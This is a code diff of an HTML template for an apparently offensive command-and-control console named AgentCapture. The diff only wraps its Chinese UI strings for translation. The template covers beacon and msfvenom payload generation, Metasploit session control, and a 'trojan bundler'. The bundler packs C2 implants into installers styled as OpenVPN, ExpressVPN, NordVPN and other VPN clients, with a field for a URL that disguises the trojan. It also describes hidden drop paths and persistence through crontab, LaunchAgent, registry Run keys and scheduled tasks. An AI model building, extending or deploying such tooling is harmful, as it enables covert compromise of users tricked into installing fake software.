@@ -202,8 +202,8 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
 <div class="page-header">
   <div class="page-header-copy">
     <div class="page-eyebrow">AGENTCAPTURE</div>
-    <h1 class="page-title">命令式 C2 管理</h1>
-    <p class="page-description">Beacon 会话、任务队列、监听器与 Artifact 的实时控制台。</p>
+    <h1 class="page-title">{{ _('命令式 C2 管理') }}</h1>
+    <p class="page-description">{{ _('Beacon 会话、任务队列、监听器与 Artifact 的实时控制台。') }}</p>
   </div>
 </div>
 <div class="mcs">
@@ -212,17 +212,17 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
     <div class="mc-toolbar">
       <span class="mc-chip">AgentCapture</span>
       <span class="mc-toolbar-divider"></span>
-      <button type="button" class="chip mc-tab primary" data-mctab="table" onclick="switchTab('table')">Beacon 列表</button>
-      <button type="button" class="chip mc-tab" data-mctab="tasks" onclick="switchTab('tasks')">任务队列</button>
-      <button type="button" class="chip mc-tab" data-mctab="beacons" onclick="switchTab('beacons')">Beacon 生成</button>
-      <button type="button" class="chip mc-tab" data-mctab="listeners" onclick="switchTab('listeners')">监听器</button>
+      <button type="button" class="chip mc-tab primary" data-mctab="table" onclick="switchTab('table')">{{ _('Beacon 列表') }}</button>
+      <button type="button" class="chip mc-tab" data-mctab="tasks" onclick="switchTab('tasks')">{{ _('任务队列') }}</button>
+      <button type="button" class="chip mc-tab" data-mctab="beacons" onclick="switchTab('beacons')">{{ _('Beacon 生成') }}</button>
+      <button type="button" class="chip mc-tab" data-mctab="listeners" onclick="switchTab('listeners')">{{ _('监听器') }}</button>
       <button type="button" class="chip mc-tab" data-mctab="msf" onclick="switchTab('msf')">MSF</button>
-      <button type="button" class="chip mc-tab" data-modal-open="bundler-modal">木马捆绑</button>
-      <button type="button" class="chip mc-tab" onclick="loadOverview()">↻ 刷新</button>
+      <button type="button" class="chip mc-tab" data-modal-open="bundler-modal">{{ _('木马捆绑') }}</button>
+      <button type="button" class="chip mc-tab" onclick="loadOverview()">{{ _('↻ 刷新') }}</button>
       <div class="mc-toolbar-right">
-        <span>在线 <b class="ok" id="t-online">0</b>/<b id="t-hosts">0</b></span>
-        <span>任务 <b id="t-tasks">0</b></span>
-        <span id="t-pending-wrap" style="display:none">待审批 <b style="color:var(--danger)" id="t-pending">0</b></span>
+        <span>{{ _('在线') }} <b class="ok" id="t-online">0</b>/<b id="t-hosts">0</b></span>
+        <span>{{ _('任务') }} <b id="t-tasks">0</b></span>
+        <span id="t-pending-wrap" style="display:none">{{ _('待审批') }} <b style="color:var(--danger)" id="t-pending">0</b></span>
         <span id="overview-generated" class="muted-sm"></span>
       </div>
     </div>
@@ -231,7 +231,7 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
     <div class="tab-content" id="tab-table" style="display:block">
       <div class="mc-grid-wrap">
         <table class="mc-table">
-          <thead><tr><th style="width:32px"></th><th>外部 IP</th><th>内部 IP</th><th>用户</th><th>主机名</th><th>系统</th><th>架构</th><th>监听器</th><th>最后心跳</th><th>备注</th><th style="width:40px"></th></tr></thead>
+          <thead><tr><th style="width:32px"></th><th>{{ _('外部 IP') }}</th><th>{{ _('内部 IP') }}</th><th>{{ _('用户') }}</th><th>{{ _('主机名') }}</th><th>{{ _('系统') }}</th><th>{{ _('架构') }}</th><th>{{ _('监听器') }}</th><th>{{ _('最后心跳') }}</th><th>{{ _('备注') }}</th><th style="width:40px"></th></tr></thead>
           <tbody id="hosts-tbody"></tbody>
         </table>
       </div>
@@ -241,7 +241,7 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
     <div class="tab-content" id="tab-tasks" style="display:none">
       <div class="mc-grid-wrap">
         <table class="mc-table">
-          <thead><tr><th>编号</th><th>代码</th><th>类型</th><th class="cp">命令</th><th>状态</th><th>风险</th><th>审批</th><th>结果摘要</th><th>动作</th></tr></thead>
+          <thead><tr><th>{{ _('编号') }}</th><th>{{ _('代码') }}</th><th>{{ _('类型') }}</th><th class="cp">{{ _('命令') }}</th><th>{{ _('状态') }}</th><th>{{ _('风险') }}</th><th>{{ _('审批') }}</th><th>{{ _('结果摘要') }}</th><th>{{ _('动作') }}</th></tr></thead>
           <tbody id="tasks-tbody"></tbody>
         </table>
       </div>
@@ -253,49 +253,49 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
         <div>
           <div style="display:flex;gap:8px;margin-bottom:12px">
             <button type="button" class="chip primary" id="gen-mode-beacon" onclick="switchGenMode('beacon')">Agent-Contract Beacon</button>
-            <button type="button" class="chip" id="gen-mode-artifact" onclick="switchGenMode('artifact')">Artifact 矩阵</button>
+            <button type="button" class="chip" id="gen-mode-artifact" onclick="switchGenMode('artifact')">{{ _('Artifact 矩阵') }}</button>
           </div>
           <div id="gen-beacon">
-          <h3 class="sec">受管 Beacon 生成器</h3>
-          <p class="muted-sm" style="margin-top:0">选择 Listener 自动带入回连地址、端口与注册令牌。Python 模板内置 9 类操作执行体；bash/powershell 为租约占位模板。</p>
+          <h3 class="sec">{{ _('受管 Beacon 生成器') }}</h3>
+          <p class="muted-sm" style="margin-top:0">{{ _('选择 Listener 自动带入回连地址、端口与注册令牌。Python 模板内置 9 类操作执行体；bash/powershell 为租约占位模板。') }}</p>
           <form id="beacon-form" class="stack" onsubmit="return generateBeacon(event)">
             <label class="fl"><span>Listener</span><select name="listenerId" id="beacon-listener" onchange="onBeaconListenerChange()"></select></label>
-            <label class="fl"><span>运行时</span>
+            <label class="fl"><span>{{ _('运行时') }}</span>
               <select name="runtimeType">
-                <option value="python">Python（完整执行体）</option>
-                <option value="bash">Bash（占位）</option>
-                <option value="powershell">PowerShell（占位）</option>
+                <option value="python">{{ _('Python（完整执行体）') }}</option>
+                <option value="bash">{{ _('Bash（占位）') }}</option>
+                <option value="powershell">{{ _('PowerShell（占位）') }}</option>
               </select>
             </label>
             <div class="g3">
-              <label class="fl"><span>回连地址</span><input name="targetHost" value="127.0.0.1"></label>
-              <label class="fl"><span>端口</span><input name="targetPort" type="number" value="8443"></label>
-              <label class="fl"><span>心跳间隔（秒）</span><input name="sleepSeconds" type="number" value="5" min="1" max="3600"></label>
+              <label class="fl"><span>{{ _('回连地址') }}</span><input name="targetHost" value="127.0.0.1"></label>
+              <label class="fl"><span>{{ _('端口') }}</span><input name="targetPort" type="number" value="8443"></label>
+              <label class="fl"><span>{{ _('心跳间隔（秒）') }}</span><input name="sleepSeconds" type="number" value="5" min="1" max="3600"></label>
             </div>
-            <button type="submit" class="btn-primary">生成 Beacon</button>
+            <button type="submit" class="btn-primary">{{ _('生成 Beacon') }}</button>
           </form>
           </div>
           <div id="gen-artifact" style="display:none">
-          <h3 class="sec">Artifact 矩阵</h3>
-          <p class="muted-sm" style="margin-top:0">Cobalt Strike 风格产物矩阵（8 格式 × 4 平台 × 4 架构）。宿主缺 nasm/mingw 时确定性降级并在 compile_log 注明。</p>
+          <h3 class="sec">{{ _('Artifact 矩阵') }}</h3>
+          <p class="muted-sm" style="margin-top:0">{{ _('Cobalt Strike 风格产物矩阵（8 格式 × 4 平台 × 4 架构）。宿主缺 nasm/mingw 时确定性降级并在 compile_log 注明。') }}</p>
           <div class="stack">
-            <div class="field-label" style="display:block"><span style="font-family:'Fira Code',monospace;font-size:9.5px;letter-spacing:.14em;color:var(--tech-cyan);opacity:.75">格式 // FORMAT</span></div>
+            <div class="field-label" style="display:block"><span style="font-family:'Fira Code',monospace;font-size:9.5px;letter-spacing:.14em;color:var(--tech-cyan);opacity:.75">{{ _('格式 // FORMAT') }}</span></div>
             <div class="art-grid" id="art-grid"></div>
             <div class="g3">
-              <label class="fl"><span>平台</span><select id="art-platform"></select></label>
-              <label class="fl"><span>架构</span><select id="art-arch"></select></label>
-              <label class="fl"><span>输出类型（msbuild）</span><select id="art-output"><option>Exe</option><option>Library</option></select></label>
+              <label class="fl"><span>{{ _('平台') }}</span><select id="art-platform"></select></label>
+              <label class="fl"><span>{{ _('架构') }}</span><select id="art-arch"></select></label>
+              <label class="fl"><span>{{ _('输出类型（msbuild）') }}</span><select id="art-output"><option>Exe</option><option>Library</option></select></label>
             </div>
-            <button type="button" class="btn-primary" onclick="generateArtifact()">生成 Artifact</button>
+            <button type="button" class="btn-primary" onclick="generateArtifact()">{{ _('生成 Artifact') }}</button>
           </div>
         </div>
         </div>
         <div>
-          <h3 class="sec">生成结果</h3>
-          <pre class="mc-out" id="beacon-result" style="height:300px">等待生成…</pre>
+          <h3 class="sec">{{ _('生成结果') }}</h3>
+          <pre class="mc-out" id="beacon-result" style="height:300px">{{ _('等待生成…') }}</pre>
           <div style="display:flex;gap:8px;margin-top:8px">
-            <button type="button" class="btn-ghost" onclick="downloadCurrent()">下载</button>
-            <button type="button" class="btn-ghost" onclick="copyBeacon()">复制到剪贴板</button>
+            <button type="button" class="btn-ghost" onclick="downloadCurrent()">{{ _('下载') }}</button>
+            <button type="button" class="btn-ghost" onclick="copyBeacon()">{{ _('复制到剪贴板') }}</button>
             <span class="muted-sm" id="beacon-meta" style="align-self:center"></span>
           </div>
         </div>
@@ -306,13 +306,13 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
     <div class="tab-content" id="tab-listeners" style="display:none">
       <div class="tabpad">
         <div style="display:flex;justify-content:flex-end;margin-bottom:14px">
-          <button type="button" class="chip primary" data-modal-open="listener-create-modal">＋ 新建监听器</button>
+          <button type="button" class="chip primary" data-modal-open="listener-create-modal">{{ _('＋ 新建监听器') }}</button>
         </div>
         <div class="token-flash" id="listener-new-token" style="display:none;margin-bottom:12px">
-          <div style="font-size:10.5px;font-weight:700;color:var(--success);margin-bottom:4px">注册令牌（仅显示一次）</div>
+          <div style="font-size:10.5px;font-weight:700;color:var(--success);margin-bottom:4px">{{ _('注册令牌（仅显示一次）') }}</div>
           <code id="listener-token-value"></code>
         </div>
-        <h3 class="sec">已配置监听器</h3>
+        <h3 class="sec">{{ _('已配置监听器') }}</h3>
         <div class="lgrid" id="listener-grid"></div>
       </div>
     </div>
@@ -320,43 +320,43 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
     <!-- ======== TAB: msf ======== -->
     <div class="tab-content" id="tab-msf" style="display:none">
       <div class="tabpad">
-        <div id="msf-status-bar" class="muted-sm" style="margin-bottom:14px">检测 MSF 集成状态…</div>
+        <div id="msf-status-bar" class="muted-sm" style="margin-bottom:14px">{{ _('检测 MSF 集成状态…') }}</div>
         <div class="g2" style="align-items:start">
           <div>
-            <h3 class="sec">RPC 配置</h3>
+            <h3 class="sec">{{ _('RPC 配置') }}</h3>
             <form id="msf-config-form" class="stack" onsubmit="return saveMsfConfig(event)">
               <div class="g2">
                 <label class="fl"><span>Host</span><input name="host" value="127.0.0.1"></label>
                 <label class="fl"><span>Port</span><input name="port" type="number" value="55553"></label>
               </div>
               <div class="g2">
-                <label class="fl"><span>用户名</span><input name="username" value="msf"></label>
-                <label class="fl"><span>密码</span><input name="password" type="password" placeholder="留空保留旧值"></label>
+                <label class="fl"><span>{{ _('用户名') }}</span><input name="username" value="msf"></label>
+                <label class="fl"><span>{{ _('密码') }}</span><input name="password" type="password" placeholder="{{ _('留空保留旧值') }}"></label>
               </div>
               <label style="display:inline-flex;align-items:center;gap:6px;font-size:12px;color:var(--muted-foreground);cursor:pointer"><input type="checkbox" name="ssl" checked style="width:auto"> SSL</label>
               <div style="display:flex;gap:8px">
-                <button type="submit" class="btn-primary">保存配置</button>
-                <button type="button" class="btn-ghost" onclick="msfDaemon('start')">启动 msfrpcd</button>
-                <button type="button" class="btn-ghost danger" onclick="msfDaemon('stop')">停止 msfrpcd</button>
+                <button type="submit" class="btn-primary">{{ _('保存配置') }}</button>
+                <button type="button" class="btn-ghost" onclick="msfDaemon('start')">{{ _('启动 msfrpcd') }}</button>
+                <button type="button" class="btn-ghost danger" onclick="msfDaemon('stop')">{{ _('停止 msfrpcd') }}</button>
               </div>
             </form>
           </div>
           <div>
-            <h3 class="sec">Payload 生成（msfvenom）</h3>
+            <h3 class="sec">{{ _('Payload 生成（msfvenom）') }}</h3>
             <form id="msf-payload-form" class="stack" onsubmit="return generateMsfPayload(event)">
               <label class="fl"><span>Payload</span><select name="payload" id="msf-payload-select"></select></label>
               <div class="g3">
                 <label class="fl"><span>LHOST</span><input name="lhost" value="0.0.0.0"></label>
                 <label class="fl"><span>LPORT</span><input name="lport" type="number" value="4444"></label>
-                <label class="fl"><span>格式</span><select name="format"><option>exe</option><option>elf</option><option>psh</option><option>py</option></select></label>
+                <label class="fl"><span>{{ _('格式') }}</span><select name="format"><option>exe</option><option>elf</option><option>psh</option><option>py</option></select></label>
               </div>
-              <button type="submit" class="btn-primary">生成并下载</button>
+              <button type="submit" class="btn-primary">{{ _('生成并下载') }}</button>
             </form>
           </div>
         </div>
-        <h3 class="sec" style="margin-top:16px">会话</h3>
+        <h3 class="sec" style="margin-top:16px">{{ _('会话') }}</h3>
         <div class="mc-grid-wrap" style="max-height:240px">
-          <table class="mc-table"><thead><tr><th>编号</th><th>类型</th><th>信息</th><th>来源</th><th>动作</th></tr></thead><tbody id="msf-sessions-tbody"></tbody></table>
+          <table class="mc-table"><thead><tr><th>{{ _('编号') }}</th><th>{{ _('类型') }}</th><th>{{ _('信息') }}</th><th>{{ _('来源') }}</th><th>{{ _('动作') }}</th></tr></thead><tbody id="msf-sessions-tbody"></tbody></table>
         </div>
       </div>
     </div><!-- /tab-msf -->
@@ -365,22 +365,22 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
       <div class="modal" role="dialog" aria-modal="true" style="width:min(720px,100%)">
         <div class="modal-header">
           <div>
-            <h2 class="modal-title" id="listener-create-title">新建受管监听器</h2>
-            <p class="muted" style="margin:6px 0 0;font-size:12.5px">创建后自动生成注册令牌，Beacon 携带令牌上线即绑定此监听器。</p>
+            <h2 class="modal-title" id="listener-create-title">{{ _('新建受管监听器') }}</h2>
+            <p class="muted" style="margin:6px 0 0;font-size:12.5px">{{ _('创建后自动生成注册令牌，Beacon 携带令牌上线即绑定此监听器。') }}</p>
           </div>
-          <button type="button" class="modal-close" data-modal-close aria-label="关闭">×</button>
+          <button type="button" class="modal-close" data-modal-close aria-label="{{ _('关闭') }}">×</button>
         </div>
         <div class="modal-body">
           <form id="listener-form" class="stack" onsubmit="return createListener(event)">
-            <label class="fl"><span>名称 *</span><input name="name" placeholder="如 lab-https-reverse" required></label>
+            <label class="fl"><span>{{ _('名称 *') }}</span><input name="name" placeholder="{{ _('如 lab-https-reverse') }}" required></label>
             <label class="fl"><span>Transport</span><select name="transport" id="listener-transport"></select></label>
             <div class="g2">
-              <label class="fl"><span>绑定地址</span><input name="bindAddress" value="0.0.0.0"></label>
-              <label class="fl"><span>端口</span><input name="bindPort" type="number" value="8443"></label>
+              <label class="fl"><span>{{ _('绑定地址') }}</span><input name="bindAddress" value="0.0.0.0"></label>
+              <label class="fl"><span>{{ _('端口') }}</span><input name="bindPort" type="number" value="8443"></label>
             </div>
             <div style="display:flex;justify-content:flex-end;gap:10px;padding-top:6px">
-              <button type="button" class="btn-ghost" data-modal-close>取消</button>
-              <button type="submit" class="btn-primary">新建监听器</button>
+              <button type="button" class="btn-ghost" data-modal-close>{{ _('取消') }}</button>
+              <button type="submit" class="btn-primary">{{ _('新建监听器') }}</button>
             </div>
           </form>
         </div>
@@ -391,58 +391,58 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
       <div class="modal" role="dialog" aria-modal="true" aria-labelledby="bundler-title" style="width:min(880px,100%)">
         <div class="modal-header">
           <div>
-            <h2 class="modal-title" id="bundler-title">木马捆绑工具</h2>
-            <p class="muted" style="margin:6px 0 0;font-size:12.5px">将 C2 植入物与合法 VPN 安装包捆绑，生成木马化安装程序（Linux / macOS / Windows）。</p>
+            <h2 class="modal-title" id="bundler-title">{{ _('木马捆绑工具') }}</h2>
+            <p class="muted" style="margin:6px 0 0;font-size:12.5px">{{ _('将 C2 植入物与合法 VPN 安装包捆绑，生成木马化安装程序（Linux / macOS / Windows）。') }}</p>
           </div>
-          <button type="button" class="modal-close" data-modal-close aria-label="关闭">×</button>
+          <button type="button" class="modal-close" data-modal-close aria-label="{{ _('关闭') }}">×</button>
         </div>
         <div class="modal-body">
           <form method="post" action="/admin/c2/bundler/generate" class="stack">
             <div class="g2">
-              <label class="fl"><span>目标平台</span>
+              <label class="fl"><span>{{ _('目标平台') }}</span>
                 <select name="bundle_type">
-                  <option value="linux">Linux (.sh) — OpenVPN 捆绑 + crontab 持久化</option>
-                  <option value="macos">macOS (.sh) — Tunnelblick 捆绑 + LaunchAgent</option>
-                  <option value="windows">Windows (.bat) — OpenVPN 捆绑 + 注册表/计划任务</option>
+                  <option value="linux">{{ _('Linux (.sh) — OpenVPN 捆绑 + crontab 持久化') }}</option>
+                  <option value="macos">{{ _('macOS (.sh) — Tunnelblick 捆绑 + LaunchAgent') }}</option>
+                  <option value="windows">{{ _('Windows (.bat) — OpenVPN 捆绑 + 注册表/计划任务') }}</option>
                 </select>
               </label>
-              <label class="fl"><span>快速预设</span>
+              <label class="fl"><span>{{ _('快速预设') }}</span>
                 <select id="bundler-preset">
-                  <option value="">自定义配置</option>
-                  <option value="openvpn">OpenVPN 客户端 (通用)</option>
-                  <option value="expressvpn">ExpressVPN 客户端</option>
-                  <option value="nordvpn">NordVPN 客户端</option>
-                  <option value="wireguard">WireGuard 客户端</option>
+                  <option value="">{{ _('自定义配置') }}</option>
+                  <option value="openvpn">{{ _('OpenVPN 客户端 (通用)') }}</option>
+                  <option value="expressvpn">{{ _('ExpressVPN 客户端') }}</option>
+                  <option value="nordvpn">{{ _('NordVPN 客户端') }}</option>
+                  <option value="wireguard">{{ _('WireGuard 客户端') }}</option>
                   <option value="cisco">Cisco AnyConnect</option>
                 </select>
               </label>
             </div>
-            <label class="fl"><span>C2 服务器地址</span><input type="text" name="c2_server" placeholder="留空使用当前地址 (http://<host>:8000)"></label>
-            <label class="fl"><span>绑定 C2 监听器（植入物将携带注册令牌）</span>
+            <label class="fl"><span>{{ _('C2 服务器地址') }}</span><input type="text" name="c2_server" placeholder="{{ _('留空使用当前地址 (http://<host>:8000)') }}"></label>
+            <label class="fl"><span>{{ _('绑定 C2 监听器（植入物将携带注册令牌）') }}</span>
               <select name="listener_id" id="bundler-listener">
-                <option value="0">匿名（不绑定监听器）</option>
+                <option value="0">{{ _('匿名（不绑定监听器）') }}</option>
               </select>
             </label>
             <div class="g2">
-              <label class="fl"><span>VPN 名称</span><input type="text" name="vpn_name" id="bundler-vpn-name" value="OpenVPN"></label>
-              <label class="fl"><span>VPN 下载 URL（用于掩盖木马）</span><input type="text" name="vpn_url" id="bundler-vpn-url" placeholder="https://openvpn.net/downloads/install.sh"></label>
+              <label class="fl"><span>{{ _('VPN 名称') }}</span><input type="text" name="vpn_name" id="bundler-vpn-name" value="OpenVPN"></label>
+              <label class="fl"><span>{{ _('VPN 下载 URL（用于掩盖木马）') }}</span><input type="text" name="vpn_url" id="bundler-vpn-url" placeholder="https://openvpn.net/downloads/install.sh"></label>
             </div>
             <div class="g2">
-              <label class="fl"><span>轮询间隔（秒）</span><input type="number" name="poll_interval" value="10" min="1" max="3600"></label>
-              <label class="fl" style="flex-direction:row;align-items:center;gap:8px;align-self:end;padding-bottom:12px"><input type="checkbox" name="persistence" value="true" checked style="width:auto;margin:0"> <span style="text-transform:none;letter-spacing:0">持久化（开机自启）</span></label>
+              <label class="fl"><span>{{ _('轮询间隔（秒）') }}</span><input type="number" name="poll_interval" value="10" min="1" max="3600"></label>
+              <label class="fl" style="flex-direction:row;align-items:center;gap:8px;align-self:end;padding-bottom:12px"><input type="checkbox" name="persistence" value="true" checked style="width:auto;margin:0"> <span style="text-transform:none;letter-spacing:0">{{ _('持久化（开机自启）') }}</span></label>
             </div>
             <details style="border:1px solid rgba(148,163,184,.14);border-radius:12px;padding:10px 12px">
-              <summary style="cursor:pointer;font-size:12.5px;color:var(--muted-foreground)">技术说明：各平台捆绑包实现方式</summary>
+              <summary style="cursor:pointer;font-size:12.5px;color:var(--muted-foreground)">{{ _('技术说明：各平台捆绑包实现方式') }}</summary>
               <div class="stack" style="margin-top:10px;font-size:12px;color:var(--muted-foreground);line-height:1.65">
-                <div><strong style="color:var(--foreground)">Linux (.sh)</strong>：自解压脚本，先装 VPN 再静默释放植入物到 <code>~/.cache/.sysd/</code>，nohup 后台运行，支持 crontab @reboot 持久化。</div>
-                <div><strong style="color:var(--foreground)">macOS (.sh)</strong>：释放到 <code>~/Library/Application Support/.systemd/</code>，LaunchAgent plist 用户级持久化，无窗口后台运行。</div>
-                <div><strong style="color:var(--foreground)">Windows (.bat)</strong>：PowerShell 下载植入物，pythonw.exe 无窗口运行；HKCU Run 注册表键 + schtasks 双重持久化。</div>
-                <div><strong style="color:var(--foreground)">Agent 植入物</strong>：纯 Python 3 零依赖，支持命令执行、文件读写/下载、自卸载；指数退避轮询（10s → 300s），心跳上报系统信息。</div>
+                <div><strong style="color:var(--foreground)">Linux (.sh)</strong>{{ _('：自解压脚本，先装 VPN 再静默释放植入物到') }} <code>~/.cache/.sysd/</code>{{ _('，nohup 后台运行，支持 crontab @reboot 持久化。') }}</div>
+                <div><strong style="color:var(--foreground)">macOS (.sh)</strong>{{ _('：释放到') }} <code>~/Library/Application Support/.systemd/</code>{{ _('，LaunchAgent plist 用户级持久化，无窗口后台运行。') }}</div>
+                <div><strong style="color:var(--foreground)">Windows (.bat)</strong>{{ _('：PowerShell 下载植入物，pythonw.exe 无窗口运行；HKCU Run 注册表键 + schtasks 双重持久化。') }}</div>
+                <div><strong style="color:var(--foreground)">{{ _('Agent 植入物') }}</strong>{{ _('：纯 Python 3 零依赖，支持命令执行、文件读写/下载、自卸载；指数退避轮询（10s → 300s），心跳上报系统信息。') }}</div>
               </div>
             </details>
             <div style="display:flex;justify-content:flex-end;gap:10px;padding-top:6px">
-              <button type="button" class="btn-ghost" data-modal-close>取消</button>
-              <button type="submit" class="btn-primary">生成并下载捆绑包</button>
+              <button type="button" class="btn-ghost" data-modal-close>{{ _('取消') }}</button>
+              <button type="submit" class="btn-primary">{{ _('生成并下载捆绑包') }}</button>
             </div>
           </form>
         </div>
@@ -473,10 +473,10 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
     <div class="mc-dock" id="console-dock" style="display:none">
       <div class="mc-info-strip" id="info-strip"></div>
       <div class="mc-quick" id="quick-actions"></div>
-      <div class="mc-out" id="dock-output"><div class="l-info">[sys] C2 控制台就绪，双击 Beacon 进入交互。</div></div>
+      <div class="mc-out" id="dock-output"><div class="l-info">{{ _('[sys] C2 控制台就绪，双击 Beacon 进入交互。') }}</div></div>
       <div class="mc-inrow">
         <span class="prefix" id="cmd-prefix">shell&gt;</span>
-        <input id="cmd-input" placeholder="输入命令，↑ 召回历史..." onkeydown="cmdKeydown(event)" />
+        <input id="cmd-input" placeholder="{{ _('输入命令，↑ 召回历史...') }}" onkeydown="cmdKeydown(event)" />
       </div>
     </div>
   </div>
